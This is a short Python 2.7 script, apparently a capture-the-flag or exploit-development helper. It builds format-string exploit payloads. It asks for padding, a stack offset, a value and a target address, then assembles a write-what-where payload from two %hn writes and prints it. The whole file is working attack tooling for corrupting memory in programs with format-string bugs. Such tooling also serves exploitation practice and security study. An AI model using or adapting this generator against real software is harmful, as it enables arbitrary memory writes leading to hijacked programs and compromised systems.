#! /usr/bin/python2.7

from struct import pack

padding = 0
offset = 0
what = 0xdeadbeef
where = 0xdeadc0de

def write(what, where):
    value = str("%#0.8x" % what)  # format as 0x00000000
    first = int(value[:6], 16)
    second = int('0x' + value[6:], 16)

    payload = 'A' * padding
    payload += pack('<I', where)
    payload += pack('<I', where+2)
    payload += '%'

    if first < second:
        second -= first
        first -= 8 + padding
        payload += str(first) + 'x%' + str(offset + 1) + '$hn%' + str(second) + 'x%' + str(offset) + '$hn'

    else:
        first -= second
        second -= 8 + padding
        payload += str(second) + 'x%' + str(offset) + '$hn%' + str(first) + 'x%' + str(offset + 1) +'$hn'

    print "Payload len:", len(payload), "\nPadding:", padding, "\nOffset:", offset
    addr = "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in payload[padding:padding+8])
    print "Address:", addr
    print "Payload:", payload[:padding] + addr + payload[padding+8:]

print '-' * 37 + "input:" + '-' * 37
try:
    padding = int(raw_input("Padding [0]: "))
except:
    pass
try:
    offset = int(raw_input("Offset [1]: "))
except:
    pass
try:
    what = int(raw_input("What [0xdeadbeef]: "), 16)
except:
    pass
try:
    where = int(raw_input("Where [0xdeadc0de]: "), 16)
except:
    pass

print '-' * 37 + "result" + '-' * 37
write(what, where)
print '-' * 80
